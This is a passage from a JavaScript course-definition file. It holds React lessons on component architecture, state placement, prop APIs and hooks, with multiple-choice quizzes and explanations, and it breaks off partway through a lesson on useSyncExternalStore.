import { course, chapter, lesson, q } from '../authoring.js';

export default course({
  slug: 'frontend-engineering',
  title: 'Frontend Engineering',
  category: 'Web',
  level: 'Beginner → Intermediate',
  duration: '8 weeks',
  accent: 'sky',
  coverKey: 'frontend-engineering',
  summary:
    'Stop fighting React and start engineering with it — architecture, hooks, state, routing, performance, accessibility, and tests that survive a refactor.',
  description:
    'You build the parts of a real React application that teams argue about: component boundaries, hook rules, where state belongs, routes, and render cost. Each chapter ends with you able to diagnose a specific class of production bug — stale closures, context re-render storms, memo that does nothing, forms that lock out keyboard users, and tests that break the moment you rename a div.',
  chapters: [
    chapter(
      'Component Architecture',
      'What a component actually is, how to compose instead of configure, and where state belongs.',
      [
        lesson('Components, Props, and the Rendering Contract', 12, `
A React component is a function that takes props and returns a description of UI. React calls it, compares the result with the previous one, and changes the minimum amount of DOM. Everything else in this course rests on getting that contract right.

### Rendering is not the DOM

\`\`\`jsx
function Price({ amount, currency = 'USD' }) {
  const formatted = new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency,
  }).format(amount);
  return <span className="price">{formatted}</span>;
}
\`\`\`

Calling \`<Price amount={49} />\` does not touch the DOM. It produces a plain object roughly like \`{ type: 'span', props: { className: 'price', children: '$49.00' } }\`. React collects those objects, diffs them against the previous tree — **reconciliation** — and commits only the differences.

Two consequences follow immediately:

- **A re-render is not automatically expensive.** A component running again does not mean the browser repaints. Most "too many renders" panic is panic about nothing; Chapter 4 shows how to measure instead of guess.
- **Render must be pure.** Same props and state in, same JSX out, no side effects. No \`fetch\`, no \`document.title = ...\`, no writing to a module-level counter. React deliberately invokes your component twice in development **Strict Mode** to make impure code fail loudly.

### Props are read-only

\`\`\`jsx
function TagList({ tags }) {
  tags.sort();                  // BUG: mutates the parent's array in place
  return <>{tags.join(', ')}</>;
}

function TagList({ tags }) {
  const sorted = [...tags].sort();   // copy first, then sort
  return <>{sorted.join(', ')}</>;
}
\`\`\`

The first version reorders data the parent still owns, and because the array reference never changed, React sees no reason to re-render anyone. The bug shows up three components away and looks like React "losing" data.

### Conditional rendering has one sharp edge

\`\`\`jsx
{cart.length && <CartSummary items={cart} />}     {/* renders a literal 0 */}
{cart.length > 0 && <CartSummary items={cart} />} {/* correct */}
\`\`\`

\`&&\` returns the left operand when it is falsy, and React renders the number \`0\` as text but skips \`false\`, \`null\`, and \`undefined\`. A stray zero above an empty cart is one of the most common React bugs in real codebases, and it survives code review because the expression looks obviously fine.

### Keys identify, they do not order

\`\`\`jsx
{items.map((item, i) => <Row key={i} item={item} />)}   {/* fragile */}
{items.map(item => <Row key={item.id} item={item} />)}  {/* correct */}
\`\`\`

A key tells React "this element is the same element as last time". With index keys, inserting at the front renumbers everything, so React reuses the wrong DOM nodes — half-typed inputs jump rows, checkboxes tick the wrong item, and CSS transitions animate the wrong element. Index keys are safe only for a list that is static, never reordered, and never filtered.

### Name the boundary, not the markup

A good component has one reason to change and a prop list you can read aloud. If you cannot name it without "And" — \`UserProfileAndSettingsPanel\` — it is two components. If it takes eleven props and seven are booleans, it is a configuration object pretending to be a component, which is the problem the next lesson solves.
        `,
        [
          q('What does React get back when it calls <Price amount={49} />?', [
            'A string of HTML that is inserted with innerHTML',
            'A plain object describing the element, which React diffs against the previous tree',
            'A live DOM node that is appended to the document immediately',
            'A promise that resolves once the browser has painted',
          ], 1, 'Components return element descriptions; React reconciles those objects and touches the DOM only where the two trees differ.'),
          q('A component calls tags.sort() on its props before rendering the list. What actually goes wrong?', [
            'Nothing, because props are frozen and the call is ignored',
            'React throws a read-only property error',
            'The list renders correctly but the sort runs twice in Strict Mode',
            'It reorders the parent-owned array in place, and because the reference never changed nothing re-renders',
          ], 3, 'Mutating a prop edits data the parent still owns while leaving its identity unchanged, so the damage surfaces elsewhere with no re-render to explain it.'),
          q('Why does Strict Mode deliberately invoke your component twice in development?', [
            'To halve the number of commits React has to make',
            'To pre-warm the reconciler cache before the first paint',
            'To make impure render logic fail loudly, such as side effects or writes to module scope',
            'To verify that every list item has a key',
          ], 2, 'A pure render returns the same JSX for the same inputs, so double invocation only breaks components that are doing something they should not during render.'),
        ]
      ),
        lesson('Composition Over Configuration', 13, `
Every long-lived React codebase eventually grows a component like this:

\`\`\`jsx
<Card
  title="Billing"
  subtitle="Manage your plan"
  showHeader
  showDivider
  showFooter
  footerAlign="right"
  primaryLabel="Save"
  onPrimary={save}
  secondaryLabel="Cancel"
  onSecondary={cancel}
  danger={false}
  compact
/>
\`\`\`

Each prop was reasonable when it was added. Together they form a private DSL that only the original author understands, and the next requirement — a footer with a checkbox in it — has no prop to add.

### Slots beat flags

\`\`\`jsx
function Card({ children }) {
  return <section className="card">{children}</section>;
}
Card.Header = ({ children }) => <header className="card-hd">{children}</header>;
Card.Body   = ({ children }) => <div className="card-bd">{children}</div>;
Card.Footer = ({ children }) => <footer className="card-ft">{children}</footer>;

// Usage — the caller composes, the card only supplies structure and style
<Card>
  <Card.Header><h2>Billing</h2></Card.Header>
  <Card.Body><PlanSummary plan={plan} /></Card.Body>
  <Card.Footer>
    <button onClick={cancel}>Cancel</button>
    <button onClick={save}>Save</button>
  </Card.Footer>
</Card>
\`\`\`

Twelve props became zero. The footer with a checkbox needs no change to \`Card\` at all. This is **composition**: the parent passes rendered UI down instead of instructions for producing it.

Multiple slots are just props that happen to hold JSX:

\`\`\`jsx
function SplitLayout({ sidebar, main }) {
  return (
    <div className="split">
      <aside>{sidebar}</aside>
      <main>{main}</main>
    </div>
  );
}

<SplitLayout sidebar={<Filters />} main={<Results />} />
\`\`\`

### Share behaviour with hooks, share markup with components

Before hooks, teams shared logic with render props and higher-order components. Today the rule is simpler: **behaviour goes in a custom hook, structure goes in a component.**

\`\`\`jsx
// Behaviour, reusable anywhere, no markup opinion at all
function useDisclosure(initial = false) {
  const [isOpen, setIsOpen] = useState(initial);
  return {
    isOpen,
    open: useCallback(() => setIsOpen(true), []),
    close: useCallback(() => setIsOpen(false), []),
    toggle: useCallback(() => setIsOpen(v => !v), []),
  };
}
\`\`\`

A \`Dropdown\`, a \`Modal\`, and an accordion row can all consume \`useDisclosure\` while looking nothing alike.

### The classic bug: components defined inside components

\`\`\`jsx
function Page() {
  const [query, setQuery] = useState('');

  // BUG: a brand-new function identity on every render of Page
  function SearchBox() {
    return <input value={query} onChange={e => setQuery(e.target.value)} />;
  }

  return <SearchBox />;
}
\`\`\`

Because \`SearchBox\` is a different function on every render, React treats it as a different component type, unmounts the old tree and mounts a fresh one. The input loses focus after every keystroke, any internal state resets, and every child remounts. Users report it as "the search box only takes one letter at a time".

The fix is to hoist the component to module scope and pass what it needs as props. The rule: **component definitions are static, component instances are dynamic.** If a function returns JSX and starts with a capital letter, it belongs at the top level of a module.

### A practical boundary test

Split a component when a piece of it has its own state that nothing else needs, when a piece is reused in a second place *unchanged*, or when the file has grown past roughly 200 lines and the JSX no longer fits on a screen. Do not split because a file "feels long" — a 300-line component with one job is easier to maintain than six 50-line components that must be read together.
        `,
        [
          q('What is the practical problem with a Card that takes showHeader, showDivider, showFooter, footerAlign and four label props?', [
            'Every new requirement needs another prop, and the flag list becomes a private DSL with no room for a footer containing a checkbox',
            'It renders measurably slower than a composed card',
            'React ignores boolean props whose value is false',
            'A component may not receive more than ten props',
          ], 0, 'Configuration props only cover the cases someone anticipated, so the first unanticipated requirement has no prop to add.'),
          q('A Dropdown, a Modal and an accordion row all need open and close behaviour but look nothing alike. What should they share?', [
            'A base component that each one renders inside',
            'A higher-order component that injects isOpen as a prop',
            'A context provider holding the open state for all three',
            'A custom hook such as useDisclosure, which shares behaviour without any markup opinion',
          ], 3, 'Behaviour belongs in a hook and structure belongs in a component, so three unrelated-looking components can reuse the same logic.'),
          q('Which is a good reason to split one component into two?', [
            'The file has grown past 200 lines while still doing one job',
            'A piece of it owns state nothing else needs, or is reused unchanged somewhere else',
            'It receives more than five props',
            'It renders a list rather than a single element',
          ], 1, 'Independent state or genuine unchanged reuse marks a real boundary; length alone does not, since one long component with one job beats six that must be read together.'),
        ]
      ),
        lesson('Where State Lives', 13, `
Most React bugs that look mysterious are state in the wrong place. There are only four places it can go, and picking correctly removes whole categories of problem.

| Where | Use for | Example |
|---|---|---|
| Local \`useState\` | Owned by one component | Is this menu open |
| Lifted to a parent | Two siblings must agree | Selected row + detail pane |
| URL (\`useSearchParams\`) | Shareable, bookmarkable, survives refresh | Filters, page number, tab |
| Server cache | Data that lives in a database | Course list, user profile |

### Colocate first, lift only when forced

Start with state in the component that uses it. Lift it to the **closest common ancestor** only when a second component genuinely needs the same value. Lifting too eagerly is how a \`isTooltipVisible\` boolean ends up in a top-level store, re-rendering the entire application on hover.

### Derive, do not synchronise

This is the highest-value rule in the chapter.

\`\`\`jsx
// WRONG — two sources of truth that must be kept in step forever
const [items, setItems] = useState([]);
const [total, setTotal] = useState(0);

useEffect(() => {
  setTotal(items.reduce((s, i) => s + i.price, 0));
}, [items]);

// RIGHT — one source of truth, the rest is arithmetic
const [items, setItems] = useState([]);
const total = items.reduce((s, i) => s + i.price, 0);
\`\`\`

The wrong version renders once with a stale total before the effect corrects it, and every new way of changing \`items\` is a new chance to forget the second setter. If a value can be computed from existing state during render, it is **not state** — it is a variable. Reach for \`useMemo\` only if that computation is genuinely expensive, which Chapter 4 defines precisely.

### The classic bug: props copied into state

\`\`\`jsx
function EditName({ user }) {
  const [name, setName] = useState(user.name);  // runs ONCE, on mount
  return <input value={name} onChange={e => setName(e.target.value)} />;
}
\`\`\`

\`useState(user.name)\` uses its argument as the **initial** value only. Select a different user and the input still shows the previous name, because the component did not unmount — it just re-rendered with new props. Teams "fix" this with a \`useEffect\` that calls \`setName(user.name)\` whenever \`user\` changes, which reintroduces the stale first render and silently discards the user's unsaved typing.

The idiomatic fix is to let React remount the component by changing its key:

\`\`\`jsx
<EditName key={user.id} user={user} />
\`\`\`

A new key means a new component instance, so state initialises again from the new props. **Changing a key is the supported way to reset state**, and it is far more reliable than reset effects.

### Push state into the URL when it describes the view

\`\`\`jsx
import { useSearchParams } from 'react-router-dom';

function ProductFilters() {
  const [params, setParams] = useSearchParams();
  const level = params.get('level') ?? 'all';

  return (
    <select
      value={level}
      onChange={e => setParams(prev => {
        const next = new URLSearchParams(prev);
        next.set('level', e.target.value);
        return next;
      })}
    >
      <option value="all">All levels</option>
      <option value="beginner">Beginner</option>
    </select>
  );
}
\`\`\`

Now the filtered view is shareable, survives a refresh, and works with the back button — three features you got for free by choosing the right home for one string. Chapter 3 builds this out with the rest of React Router.
        `,
        [
          q('Filters and the page number are pushed into the URL instead of useState. What does that buy?', [
            'Faster rendering, a smaller bundle and fewer effects',
            'Links that can be shared, a view that survives a refresh, and a working back button',
            'Automatic caching, deduplication and retries',
            'Type safety and validation of the filter values',
          ], 1, 'The URL is the one state container the browser itself persists, shares and navigates, so putting view-describing state there gets all three behaviours free.'),
          q('Two sibling components must agree on the selected row. Where does that state belong?', [
            'In each sibling, kept in step by an effect',
            'In a global store so any component can read it',
            'Lifted to their closest common ancestor',
            'In a ref on the parent, to avoid re-renders',
          ], 2, 'Lift only as far as the nearest ancestor both siblings share; lifting further re-renders subtrees that do not care.'),
          q('Teams patch the stale edit form by adding useEffect(() => setName(user.name), [user]). What does that reintroduce?', [
            'A stale first render, plus a reset that discards whatever the user had already typed',
            'An infinite render loop that React cannot batch',
            'A hook-order violation that breaks later hooks',
            'A memory leak in the input element',
          ], 0, 'The effect runs after the render that already showed the wrong name, and it fires again on any user change, overwriting whatever was typed.'),
        ]
      ),
        lesson('Prop APIs, Defaults, and Forwarded Refs', 13, `
A component used in twenty places has an API, and every change to it costs twenty edits. Design the props the way you would design a function signature you cannot cheaply change later.

### Defaults belong in the parameter list

\`\`\`jsx
function Button({ variant = 'primary', size = 'md', className = '', ...rest }) {
  return (
    <button
      type="button"
      {...rest}
      className={\`btn btn--\${variant} btn--\${size} \${className}\`}
    />
  );
}
\`\`\`

Destructuring defaults are the mechanism for function components — \`defaultProps\` was removed for them in React 19. Note \`type="button"\`: without it a button inside a form submits it, which is the bug Chapter 5 returns to.

### Rest props decide who wins

Where you put \`{...rest}\` is a decision, not a formatting choice. Spread last, as above, and a caller can override \`type\`, attach \`onClick\`, or pass \`data-testid\` and \`aria-label\` straight through to the DOM node. Spread first and your own props win instead. Both are defensible; choosing by accident is not.

\`className\` is the one that must never be left in the spread. If a caller passes \`className="mt-4"\` and you spread it after your own, their utility class replaces every class your component applied and the button renders unstyled. Pull it out of \`rest\` by name and concatenate it — that is what the parameter list above does, and what \`clsx\` does more tidily.

### Forward the ref or the node is unreachable

\`\`\`jsx
const TextField = forwardRef(function TextField({ label, id, ...rest }, ref) {
  return (
    <>
      <label htmlFor={id}>{label}</label>
      <input id={id} ref={ref} {...rest} />
    </>
  );
});
\`\`\`

\`ref\` is not an ordinary prop before React 19 — React consumes it — so a component that does not forward it hands the parent nothing. The symptom is quiet: \`firstInvalidRef.current?.focus()\` after a failed submit finds \`null\`, the optional chain swallows it, and focus management simply never happens. React 19 passes \`ref\` as a normal prop and the wrapper becomes optional, but every input, button and scrollable panel in a design system still needs the ref to reach a real DOM node.

### The polymorphic \`as\` prop

\`\`\`jsx
function Surface({ as: Tag = 'div', ...rest }) {
  return <Tag className="surface" {...rest} />;
}

<Surface as="section" aria-labelledby="billing-heading" />
<Surface as={Link} to="/courses" />
\`\`\`

The rename to \`Tag\` is required, not cosmetic. JSX reads a lowercase name as a literal DOM tag, so \`<as {...rest} />\` emits an \`<as>\` element: no error, no styles, no semantics, and a layout that looks broken for reasons the console never mentions. Capitalise the variable and JSX looks the value up in scope instead.

### Keep the surface small

| Smell | Better shape |
|---|---|
| \`isPrimary\`, \`isDanger\`, \`isGhost\` | one \`variant\` prop with named values |
| \`showIcon\` + \`iconName\` + \`iconSide\` | an \`icon\` prop that takes a node |
| \`onOk\` here, \`onYes\` there, \`onConfirm\` elsewhere | one name across the whole system |
| Seven booleans | the composition from earlier in this chapter |

Mirror the names people already know — \`value\` with \`onChange\`, \`disabled\`, \`children\` — so your component behaves like the element it wraps. A \`Toggle\` whose change handler is called \`onSwitch\` costs every future reader a trip to the source.

The review test: can someone use this component correctly from the prop names alone, and can you add the next requirement without adding another boolean? If both are yes, the API is finished.
        `,
        [
          q('Surface is written as function Surface({ as = "div", ...rest }) and rendered as <as {...rest} />. What reaches the browser?', [
            'A div, because as defaults to the string div',
            'A literal <as> element, because JSX treats a lowercase name as a DOM tag',
            'A React error about an invalid element type',
            'Whatever component is named as in the enclosing scope',
          ], 1, 'JSX only looks a name up in scope when it is capitalised, so the lowercase variable is emitted verbatim as an unknown HTML tag.'),
          q('Placing {...rest} after your own className and type in the JSX means what?', [
            'React merges duplicate props automatically',
            'Extra attributes from the caller are dropped',
            'Callers can override those values, which should be a deliberate decision rather than an accident of ordering',
            'The spread applies only to data- and aria- attributes',
          ], 2, 'Later JSX attributes win, so spread position is what decides whether the component or its caller has the final say.'),
          q('A parent calls inputRef.current?.focus() on a design-system TextField and nothing happens. The usual cause is', [
            'the component never forwarded the ref down to the real <input>',
            'the ref was created with useState instead of useRef',
            'focus() only works from inside useLayoutEffect',
            'the input is uncontrolled, so it has no focus method',
          ], 0, 'Without forwarding, ref never reaches a DOM node, current stays null, and the optional chain hides the failure completely.'),
        ]
      ),
      ],
      [
        q('Why does {items.length && <List />} sometimes render a bare 0?', [
          'React coerces empty arrays to 0',
          'length is a string in JSX',
          '&& returns the falsy left operand, and React renders the number 0 as text',
          'JSX requires an explicit return',
        ], 2, 'React skips false, null and undefined but renders 0 as a text node, so the falsy length leaks onto the page.'),
        q('An input inside a component defined inside another component loses focus after each keystroke. Why?', [
          'The input is uncontrolled',
          'The inner component is a new function identity each render, so React remounts its subtree',
          'onChange fires twice in Strict Mode',
          'The key prop is missing',
        ], 1, 'A new function type each render makes React unmount the old tree and mount a fresh one, destroying focus and state.'),
        q('A total can be computed from an items array. Where should it live?', [
          'In its own useState, synced by a useEffect',
          'In context so children can read it',
          'In a ref updated on change',
          'Computed during render from items',
        ], 3, 'Anything derivable from existing state is a variable, not state — a second source of truth can only drift.'),
        q('An edit form initialised with useState(user.name) shows the old name after switching users. Best fix?', [
          'Give the component key={user.id} so it remounts with fresh initial state',
          'Add a useEffect that calls setName when user changes',
          'Move name into a ref',
          'Wrap the component in React.memo',
        ], 0, 'Changing the key creates a new instance, which is the supported way to reset state without a stale first render.'),
      ]
    ),
    chapter(
      'Hooks in Depth',
      'State, effects, refs, and the custom hooks you extract once the patterns repeat.',
      [
        lesson('useState, Batching, and useReducer', 13, `
\`useState\` looks like a variable. It is closer to a mailbox: you read the value React handed you for *this* render, and you post a request for the next one.

### The value in scope is a snapshot

\`\`\`jsx
function Counter() {
  const [count, setCount] = useState(0);

  function handleTripleClick() {
    setCount(count + 1);
    setCount(count + 1);
    setCount(count + 1);
    console.log(count);   // still the old value — this render's snapshot
  }
  // count goes up by 1, not 3
}
\`\`\`

Every render gets its own \`count\` constant. All three calls read the same snapshot, compute the same number, and the last one wins. React then **batches** them into a single re-render.

The fix is the updater form, which receives the pending value rather than the captured one:

\`\`\`jsx
setCount(c => c + 1);
setCount(c => c + 1);
setCount(c => c + 1);   // now +3
\`\`\`

**Rule: if the next state depends on the previous state, pass a function.** This also makes the setter safe to call from a \`setTimeout\`, an event listener, or any other closure that may be older than the current render.

### Lazy initialisation

\`\`\`jsx
const [tree, setTree] = useState(buildTree(rawNodes));   // runs EVERY render
const [tree, setTree] = useState(() => buildTree(rawNodes));  // runs once
\`\`\`

The first form still discards the result after mount, but it pays the cost forever. Pass a function whenever the initial value is more than a literal — parsing \`localStorage\`, building a Map, generating an id.

### Objects in state are replaced, not edited

\`\`\`jsx
setProfile(p => ({ ...p, address: { ...p.address, city } }));
\`\`\`

React compares by reference, so mutating \`profile.address.city\` and calling \`setProfile(profile)\` renders nothing at all. Deeply nested spreads are a smell: either flatten the shape or reach for a reducer.

### useReducer: when transitions have rules

Split \`useState\` calls describe *values*. A reducer describes *transitions*, which is what you want the moment two pieces of state must change together.

\`\`\`jsx
const initial = { status: 'idle', data: null, error: null, page: 1 };

function reducer(state, action) {
  switch (action.type) {
    case 'fetch':   return { ...state, status: 'loading', error: null };
    case 'success': return { ...state, status: 'ready', data: action.data };
    case 'failure': return { ...state, status: 'error', error: action.error };
    case 'nextPage':
      // A guard the UI can never accidentally skip
      return state.status === 'loading' ? state : { ...state, page: state.page + 1 };
    default: throw new Error(\`Unknown action: \${action.type}\`);
  }
}

const [state, dispatch] = useReducer(reducer, initial);
dispatch({ type: 'fetch' });
\`\`\`

Three benefits are immediate. Impossible states become unrepresentable — you can no longer have \`status: 'error'\` with \`error: null\` unless the reducer allows it. The transition logic is a plain function, so it is testable without rendering anything. And \`dispatch\` has a **stable identity for the life of the component**, which means passing it to memoised children never breaks memoisation the way a fresh callback would.

### Choosing between them

| Signal | Reach for |
|---|---|
| One independent value | \`useState\` |
| Next value depends on previous | \`useState\` + updater function |
| Several fields change together | \`useReducer\` |
| Transitions have guards or invariants | \`useReducer\` |
| Logic needs unit tests without a DOM | \`useReducer\` |

The migration is cheap in both directions, so start with \`useState\` and convert when the third related \`useState\` appears in the same component.
        `,
        [
          q('What is the difference between useState(buildTree(raw)) and useState(() => buildTree(raw))?', [
            'The first runs only on mount, the second on every render',
            'They are identical; the arrow form is a style preference',
            'The first calls buildTree on every render and throws the result away after mount',
            'The second delays the state until after the first paint',
          ], 2, 'Only the lazy form defers the call to mount; the eager form pays the full cost on every single render for a value React ignores.'),
          q('You set profile.address.city directly and then call setProfile(profile). Nothing re-renders. Why?', [
            'React compares state by reference, and the reference did not change',
            'setProfile accepts only an updater function',
            'React batched the update away because nothing else changed',
            'Objects placed in state are frozen by React',
          ], 0, 'State updates are detected by identity, so mutating an object and passing the same reference back looks like no change at all.'),
          q('Which signal points to useReducer rather than useState?', [
            'A single boolean the parent toggles',
            'A value read once from localStorage',
            'A DOM node you need in order to call focus()',
            'Several fields that change together under guarded transitions you want to unit test',
          ], 3, 'Reducers describe transitions in one plain function, which is exactly what related fields with invariants need and what a test can call without rendering.'),
        ]
      ),
        lesson('useEffect: Dependencies, Cleanup, and Races', 14, `
\`useEffect\` is not "run this after render". It is **synchronise this component with something outside React** — a network, a subscription, a browser API, a third-party widget. Every time you reach for it, ask what external system you are syncing with. If the answer is "none", you probably do not need an effect.

### You often do not need an effect

\`\`\`jsx
// UNNECESSARY: derived data
useEffect(() => { setFullName(first + ' ' + last); }, [first, last]);
const fullName = first + ' ' + last;                      // just compute it

// UNNECESSARY: reacting to a user event
useEffect(() => { if (submitted) postForm(values); }, [submitted]);
function handleSubmit() { postForm(values); }             // do it in the handler
\`\`\`

Effect-driven event logic runs one render late, fires again after a refresh if the flag persists, and turns a straight line into a state machine. Put event logic in the event handler.

### The dependency array is a correctness tool

\`\`\`jsx
useEffect(() => { ... });               // after every render — almost always wrong
useEffect(() => { ... }, []);           // once, on mount
useEffect(() => { ... }, [courseId]);   // whenever courseId changes
\`\`\`

Every reactive value the effect reads — props, state, and anything derived from them — belongs in the array. Removing a dependency to "stop it looping" does not fix the loop, it freezes the effect around stale values. Enable \`react-hooks/exhaustive-deps\` and treat its warnings as errors. When a dependency genuinely should not re-trigger the effect, the honest fixes are: move the function inside the effect, wrap it in \`useCallback\` at the definition site, or keep the changing value in a ref.

### Cleanup, and the race condition everyone ships once

\`\`\`jsx
useEffect(() => {
  const controller = new AbortController();

  (async () => {
    try {
      const res = await fetch(\`/api/courses/\${slug}\`, { signal: controller.signal });
      if (!res.ok) throw new Error(res.status);
      setCourse(await res.json());
    } catch (err) {
      if (err.name !== 'AbortError') setError(err);
    }
  })();

  return () => controller.abort();   // cancels the previous request
}, [slug]);
\`\`\`

Without that cleanup, switching from course A to course B fires two requests. If A's slower response lands second, it overwrites B — the user sees the wrong page and no error anywhere. **This is the single most common data-fetching bug in React applications**, and it is invisible on a fast local network, which is why it reaches production.

The cleanup function runs before the next effect and once on unmount. The same discipline applies to everything you set up:

\`\`\`jsx
useEffect(() => {
  const onResize = () => setWidth(window.innerWidth);
  window.addEventListener('resize', onResize);
  return () => window.removeEventListener('resize', onResize);
}, []);
\`\`\`

An event listener without a matching removal is a memory leak plus a setState on an unmounted component.

### Strict Mode runs your effect twice on purpose

In development, React 18+ mounts, unmounts, and remounts each component once. An effect with correct cleanup is unaffected. An effect without it double-subscribes, double-fetches, or double-increments — which is the point. If Strict Mode breaks your effect, production will break it too, just less predictably.

### Dependencies you cannot see

\`\`\`jsx
// options is a new object every render, so the effect runs forever
function Chart({ options }) {
  useEffect(() => { draw(options); }, [options]);
}
\`\`\`

React compares dependencies with \`Object.is\`. Objects, arrays, and functions created during render are new every time. Either memoise them at the source, or depend on the primitive fields you actually use — \`[options.width, options.height]\`.
        `,
        [
          q('Why is useEffect(() => { if (submitted) postForm(values); }, [submitted]) the wrong shape?', [
            'Event logic belongs in the handler; via an effect it runs a render late and fires again if the flag persists',
            'React forbids conditional statements inside an effect body',
            'postForm has to be wrapped in useCallback before an effect may call it',
            'The dependency array should be empty so it only runs once',
          ], 0, 'An effect is for syncing with an external system, not for reacting to a user event that already had a handler.'),
          q('function Chart({ options }) { useEffect(() => draw(options), [options]); } loops forever. What is the cause?', [
            'draw mutates the options object it is given',
            'Effects re-run whenever they call a function defined outside them',
            'A dependency array may contain only primitive values',
            'React compares dependencies with Object.is, and options is a new object on every parent render',
          ], 3, 'Objects created during the parent render are never identical to the previous ones, so the effect re-runs, re-renders, and repeats.'),
          q('An effect works normally but misbehaves under Strict Mode double mounting. What does that tell you?', [
            'Strict Mode is a development-only quirk that should be disabled',
            'The cleanup is missing or incomplete, and production will break the same way less predictably',
            'The dependency array needs to be emptied',
            'The component should be wrapped in React.memo',
          ], 1, 'An effect with correct cleanup is unaffected by mount, unmount and remount, so a failure there is a real subscription or fetch leak.'),
        ]
      ),
        lesson('Refs, Layout Effects, and Custom Hooks', 14, `
Not every value that changes should trigger a render. \`useRef\` gives you a mutable box that survives renders and never causes one.

### Two jobs, one hook

\`\`\`jsx
// 1. A handle on a DOM node
const inputRef = useRef(null);
useEffect(() => { inputRef.current?.focus(); }, []);
return <input ref={inputRef} />;

// 2. An instance variable React should ignore
const timerRef = useRef(null);
function start() {
  timerRef.current = setInterval(tick, 1000);
}
useEffect(() => () => clearInterval(timerRef.current), []);
\`\`\`

Storing that interval id in \`useState\` would re-render the component for a value nothing displays. The test is simple: **if changing it should update the screen, it is state; otherwise it is a ref.**

Refs are also the escape hatch for values an effect needs but should not react to:

\`\`\`jsx
function useInterval(callback, delay) {
  const saved = useRef(callback);
  useEffect(() => { saved.current = callback; });   // always the latest

  useEffect(() => {
    const id = setInterval(() => saved.current(), delay);
    return () => clearInterval(id);
  }, [delay]);   // restarts only when the delay changes, not every render
}
\`\`\`

Reading \`ref.current\` during render is off-limits — it makes rendering impure and breaks concurrent features. Read and write refs in effects and event handlers.

### useLayoutEffect: when a flash is unacceptable

\`useEffect\` runs *after* the browser paints. \`useLayoutEffect\` runs after the DOM mutation but *before* paint, blocking it.

\`\`\`jsx
useLayoutEffect(() => {
  const { height } = contentRef.current.getBoundingClientRect();
  setTooltipTop(anchorTop - height - 8);   // measure, then position
}, [isOpen]);
\`\`\`

With \`useEffect\` here, the tooltip paints at the wrong position for one frame and visibly jumps. Use \`useLayoutEffect\` only for measure-then-mutate work; it is synchronous, so anything slow in it delays the frame.

### Custom hooks are functions that call hooks

A custom hook shares **logic**, never state. Two components calling \`useDebouncedValue\` each get their own independent timer and value.

\`\`\`jsx
function useDebouncedValue(value, delay = 300) {
  const [debounced, setDebounced] = useState(value);

  useEffect(() => {
    const id = setTimeout(() => setDebounced(value), delay);
    return () => clearTimeout(id);   // each keystroke cancels the previous timer
  }, [value, delay]);

  return debounced;
}

// In a search box: one request after typing stops, not one per keystroke
const query = useDebouncedValue(input, 400);
useEffect(() => { if (query) search(query); }, [query]);
\`\`\`

For a user typing a ten-character query, that is 1 request instead of 10.

### The rules of hooks, and why they exist

1. Call hooks only at the top level — never inside a condition, loop, or nested function.
2. Call them only from components or other hooks.

React does not know your hooks by name. It tracks them by **call order**, as a list per component. An early \`return\` before a \`useState\` shifts every later hook by one slot, so your \`isOpen\` boolean reads the value that belonged to \`errorMessage\`. The symptom is bizarre — unrelated state appearing in the wrong variable — which is why the ESLint plugin is not optional.

\`\`\`jsx
if (!user) return null;               // BUG: hooks below are skipped
const [tab, setTab] = useState('a');

const [tab, setTab] = useState('a');  // all hooks first
if (!user) return null;               // then the early return
\`\`\`

### Extract a hook when the pattern is the third copy

Two similar effects are a coincidence. Three are a hook. Good candidates from real apps: \`useLocalStorage\`, \`useMediaQuery\`, \`useOnClickOutside\`, \`useDisclosure\` from Chapter 1, and \`useDebouncedValue\` above. Name them for what they give you, not for the hook they wrap.
        `,
        [
          q('A tooltip measures its own height and then positions itself. Why useLayoutEffect rather than useEffect?', [
            'useEffect cannot read from the DOM at all',
            'It runs after the DOM mutation but before paint, so the tooltip is never visible in the wrong place',
            'It is a faster implementation of the same hook',
            'Refs are only populated by the time a layout effect runs',
          ], 1, 'Measure-then-position work must finish before the browser paints, or the user sees one frame at the wrong coordinates.'),
          q('Two components both call useDebouncedValue. What do they share?', [
            'The debounced value, because hooks are module-level singletons',
            'The timer, so the second caller cancels the first',
            'The logic only, since each call gets its own independent state and timer',
            'Nothing, until both are wrapped in the same provider',
          ], 2, 'A custom hook is a function that calls hooks, so every caller creates a fresh, isolated set of state.'),
          q('Why is reading ref.current during render off-limits?', [
            'It makes rendering impure and breaks concurrent features, so refs belong in effects and handlers',
            'The ref is guaranteed to be null while rendering',
            'Reading a ref schedules an additional re-render',
            'It prevents the ref from being attached to a DOM node',
          ], 0, 'A ref can hold a different value on every read, so consulting it during render makes the output depend on something React does not track.'),
        ]
      ),
        lesson('useId, useSyncExternalStore, and useImperativeHandle', 14, `
Three hooks sit outside the everyday set. You will not reach for them weekly, but each solves a problem the everyday hooks solve badly.

### useId: ids that survive re-rendering

\`\`\`jsx
function Field({ label, error, ...rest }) {
  const id = useId();
  const errorId = \`\${id}-error\`;

  return (
    <>
      <label htmlFor={id}>{label}</label>
      <input
        id={id}
        aria-invalid={!!error}
        aria-describedby={error ? errorId : undefined}
        {...rest}
      />
      {error && <p id={errorId} role="alert">{error}</p>}
    </>
  );
}
\`\`\`

One call namespaces as many ids as the component needs; append suffixes rather than calling \`useId\` once per element. What it replaces is \`Math.random()\` and module-level counters, and it replaces them for two reasons. A fresh id on every render silently detaches \`htmlFor\` and \`aria-describedby\` from the elements they point at, and a counter that starts on the server and restarts in the browser produces different ids in the two passes, which React reports as a hydration mismatch.

The one job \`useId\` must not be given is list keys. Keys come from your data, as Chapter 1 insisted; an id minted during render tells React nothing about which row is which.

### useSyncExternalStore: read a value React does not own

\`navigator.onLine\`, \`window.matchMedia\`, \`localStorage\`, a Redux-style store, a game loop — anything that changes without React being told.

\`\`\`jsx
function subscribe(callback) {
  window.addEventListener('online', callback);
  window.addEventListener('offline', callback);
  return () => {
    window.removeEventListener('online', callback);
    window.removeEventListener('offline', callback);
  };
}

export function useOnlineStatus() {
  return useSyncExternalStore(
    subscribe,
    () => navigator.onLine,   // snapshot in the browser
    () => true                // snapshot during server rendering
  );
}
\`\`\`

The obvious alternative — \`useState\` seeded in a \`useEffect\` — has two defects. It renders once with a guessed value before the effect corrects it, and under concurrent rendering two components can read the same source at different moments and disagree on screen, which React calls tearing. \`useSyncExternalStore\` reads the snapshot synchronously during render and re-reads it whenever the subscription fires.

**The mistake everyone makes once** is returning a fresh object from the snapshot function:

\`\`\`jsx
() => ({ online: navigator.onLine })   // a new object on every call
\`\`\`

